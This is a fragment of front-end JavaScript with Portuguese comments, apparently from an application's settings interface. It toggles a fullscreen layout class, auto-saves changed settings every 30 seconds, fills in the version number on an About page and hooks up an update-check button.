function updateLayout() {
    const isFullscreen = document.fullscreenElement !== null;
    const container = document.querySelector('.container');
    
    if (isFullscreen) {
        container.classList.add('fullscreen');
    } else {
        container.classList.remove('fullscreen');
    }
}

// Event Listeners para Layout
document.addEventListener('fullscreenchange', updateLayout);
window.addEventListener('resize', updateLayout);

// Sistema de Salvamento Automático
let autoSaveInterval;

function startAutoSave() {
    if (autoSaveInterval) clearInterval(autoSaveInterval);

    autoSaveInterval = setInterval(() => {
        if (settingsChanged) { // Só salva se houver mudanças
            saveSettings();
            showToast('Configurações salvas automaticamente', 'success'); // Mostra toast apenas no auto-save
        } else {
            console.log('Auto-save: Nenhuma mudança detectada.'); // Log para debug
        }
    }, 30000); // Salva a cada 30 segundos
}

// Iniciar auto-save quando a aplicação carregar
startAutoSave();

// Inicializa o tour quando o DOM estiver pronto
document.addEventListener('DOMContentLoaded', () => {
    loadSettings(); // loadSettings agora chama startTour na condição correta
});

// Função para preencher informações na página Sobre
function populateAboutPage() {
    document.getElementById('app-version').textContent = currentVersion; // currentVersion já existe
    // document.getElementById('developer-name').textContent = 'Seu Nome/Nickname'; // Adicionar um span com id="developer-name" no HTML se quiser dinâmico
}

// Evento para o botão verificar atualização na página Sobre
document.getElementById('check-update-button').addEventListener('click', () => {
    checkforUpdates(); // checkforUpdates já existe
}); 